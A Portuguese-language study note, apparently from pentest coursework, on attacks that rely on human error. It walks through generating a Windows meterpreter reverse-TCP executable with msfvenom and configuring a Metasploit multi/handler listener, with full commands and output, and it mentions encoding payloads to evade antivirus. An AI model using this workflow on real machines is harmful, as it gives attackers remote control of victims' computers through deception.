# Conceito

- Não é explorada uma vunerabilidade do sistema, mas a falha humana.
- Consiste de enviar um payload à máquina alvo e esperar a sua execução. O payload é executado pelo próprio usuário da máquina alvo.

## Criação do payload - msfvenom

O **`msfvenom`** é uma ferramenta do **Metasploit Framework**, usada principalmente para **criar payloads** maliciosos customizados.

O `msfvenom` permite que você:
* **Gere executáveis maliciosos** (ex.: `.exe`, `.apk`, `.elf`, `.ps1`) que, quando executados, dão controle remoto da máquina para o atacante.
* **Incorpore payloads em arquivos existentes** (ex.: PDF, imagem, etc.).
* **Codifique/encode** o payload com diferentes métodos para dificultar detecção por antivírus.
* **Escolha formatos de saída** (binário cru, executável, código fonte em C, Python, Powershell etc.).
Criando um arquivo executável...  
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell1.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell1.exe
```

## Listening
Após o payload ser enviado, começamos a escutar a rede, aguardando o pauload ser executado.
- É necessário estar executando o listening antes da execução do playload.

Iniciando a escuta...
```
$ msfconsole
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```
msf6 exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
Necessitamos alterar o payload do listenner para o mesmo payload do arquivo executável.
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
E configurar o IP da máquina de escuta
```
msf6 exploit(multi/handler) > set LHOST 192.168.1.10 
LHOST => 192.168.1.10
```
Verificando uma última vez...
```
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
Tudo certo para iniciar a escuta...
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:4444
```
      
